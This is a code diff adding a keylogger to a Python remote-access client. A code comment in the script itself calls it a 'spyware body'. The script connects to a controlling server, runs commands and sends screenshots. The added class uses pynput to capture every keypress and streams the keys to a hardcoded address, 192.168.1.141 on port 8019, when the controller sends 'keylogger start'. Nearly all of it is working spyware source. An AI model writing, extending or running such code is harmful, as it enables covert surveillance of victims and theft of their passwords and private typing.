@@ -2,6 +2,7 @@ import socket
 import time
 import os
 import subprocess
+import threading
 try:
     import PIL
     from PIL import ImageGrab
@@ -10,6 +11,13 @@ try:
 except:
     pilacticve = False
 print("PIL status:",pilacticve)
+try:
+    import pynput
+    from pynput import keyboard
+    pynputacticve = True
+except:
+    pynputacticve = False
+print("pynput status:",pynputacticve)
 #establishing standards:
 #b'_' acknowledgement
 #b'&end' signifys finnishing a transmition
@@ -26,7 +34,7 @@ class terminal:
             print(result)
         return result
 class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
-    def __init__(self,pilactive) -> None: #pilactive is true if pil is installed
+    def __init__(self,pilactive,pynputactive) -> None: #pilactive is true if pil is installed
         self.server = socket.socket()
         self.connect()
     def connect(self):
@@ -36,7 +44,7 @@ class remote_connection: #hopefully this class should provide neatly packaged fu
                 break
             except:
                 print("connection not available, failed to connect")
-        self.handshake(["connected",pilacticve])
+        self.handshake(["connected",pilacticve,pynputacticve])
     def shutdown_socket(self):
         self.server.shutdown(socket.SHUT_RDWR)
         self.server.close()
@@ -61,11 +69,37 @@ class remote_connection: #hopefully this class should provide neatly packaged fu
         except Exception as problem:
             print(problem)
             self.shutdown_socket()
-            self.__init__(pilactive=pilacticve)
-socket_handler = remote_connection(pilacticve)
+            self.__init__(pilactive=pilacticve,pynputactive=pynputacticve)
+socket_handler = remote_connection(pilacticve,pynputacticve)
 terminal = terminal()
 incoming_buffer = []
 outgoing_buffer = []
+class keyboard_worker:
+    def __init__(self) -> None:
+        if pynputacticve != True:
+            return
+        self.listener = keyboard.Listener(on_press=self.on_press) 
+        self.key_buffer = []
+    def on_press(self,key):
+        self.key_buffer.append(str(key))
+    def input_transmitter(self):
+        self.listener.start()
+        temp_server = socket.socket()
+        while True:
+            try:
+                temp_server.connect(("192.168.1.141",8019))
+                break
+            except:
+                print("file transfer socket error")
+        print("sucsessfull keylogger connection")
+        while True:
+            for index, i in enumerate(self.key_buffer):
+                temp_server.sendall(i.strip().encode())
+                self.key_buffer.pop(index)
+                temp_server.recv(1024)    
+            temp_server.sendall(b"_")
+            temp_server.recv(1024)
+keylogger = keyboard_worker()
 while True:
     try:
         new_incoming_buffer = socket_handler.handshake(outgoing_buffer)
@@ -112,8 +146,14 @@ while True:
                     temp_server.close()
                     os.remove("screenshot.png")
                     print("screenshot sucsessfully sent")
-            if outgoing_buffer[-1] == "":
-                del(outgoing_buffer)[-1]
+                case "keylogger start":
+                    print("starting keylogger thread")
+                    threading.Thread(target=keylogger.input_transmitter).start()
+            try:
+                if outgoing_buffer[-1] == "":
+                    del(outgoing_buffer)[-1]
+            except:
+                pass
             counter += 1        
     except Exception as problem:
         print(problem)
